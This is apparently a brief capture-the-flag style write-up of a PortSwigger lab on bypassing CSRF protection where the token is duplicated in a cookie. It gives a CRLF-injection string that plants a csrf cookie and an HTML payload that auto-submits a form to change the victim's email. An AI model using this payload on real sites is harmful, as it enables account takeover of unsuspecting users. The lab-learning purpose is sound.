#CSRF #CSRF-Tokens 

CSRF Where token is simply duplicated in a cookie: [link](https://portswigger.net/web-security/csrf/bypassing-token-validation/lab-token-duplicated-in-cookie)

In a further variation on the preceding vulnerability, some applications do not maintain any server-side record of tokens that have been issued, but instead duplicate each token within a cookie and a request parameter. When the subsequent request is validated, the application simply verifies that the token submitted in the request parameter matches the value submitted in the cookie.

this challenge like the previous challenge it have a CRLF injection we use it to change value of cookie and give it value of csrf token in the  form
`%0d%0aSet-Cookie:%20csrf=myToken%3bSameSite=None`

payload

```
<html>
	<form action="https://0a4400c704ab63408068036a001b005c.web-security-academy.net/my-account/change-email" method="POST">
		<label>Email</label>
		<input required="" type="email" name="email" value="ammmeo@gmail.com">
		<input required="" type="hidden" name="csrf" value="ut2jeum08BGH1dxn1rvkQqf4Nm4X12X7">
		<button class="button" type="submit"> Update email </button>
	</form>
	<img src="https://0a4400c704ab63408068036a001b005c.web-security-academy.net/?search=cc%0d%0aSet-Cookie:%20csrf=ut2jeum08BGH1dxn1rvkQqf4Nm4X12X7%3bSameSite=None" onerror="document.forms[0].submit()">

</html>

```